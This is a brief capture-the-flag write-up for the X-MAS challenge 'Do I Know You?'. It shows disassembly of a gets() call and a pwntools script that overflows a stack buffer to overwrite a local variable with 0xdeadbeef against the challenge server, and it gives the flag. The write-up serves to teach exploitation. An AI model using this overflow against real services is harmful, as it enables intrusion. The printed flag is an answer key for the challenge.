# Do I Know You?

If we disassemble, the solution is pretty clear.

```text
[...]
|           0x55c00f08685d      4889c7         mov rdi, rax
│           0x55c00f086860      b800000000     mov eax, 0
│           0x55c00f086865      e846feffff     call sym.imp.gets
│           0x55c00f08686a      488b55f0       mov rdx, qword [var_10h]
│           0x55c00f08686e      b8efbeadde     mov eax, 0xdeadbeef
│           0x55c00f086873      4839c2         cmp rdx, rax
│       ┌─< 0x55c00f086876      7522           jne 0x55c00f08689a
│       │   0x55c00f086878      488d3de90000.  lea rdi, str.X_MAS_Fake_flag...
[...]
```

`gets()` is used to take in input, then the contents of another local variable are compared to `0xdeadbeef`. Basic buffer overflow then overwrite a local variable:

```python
from pwn import *

elf = context.binary = ELF('./chall')
p = remote('challs.xmas.htsp.ro', 2008)

payload = b'A' * 32
payload += p64(0xdeadbeef)

p.sendlineafter('you?\n', payload)
print(p.recvuntil('}'))
```

`X-MAS{ah_yes__i_d0_rememb3r_you}`

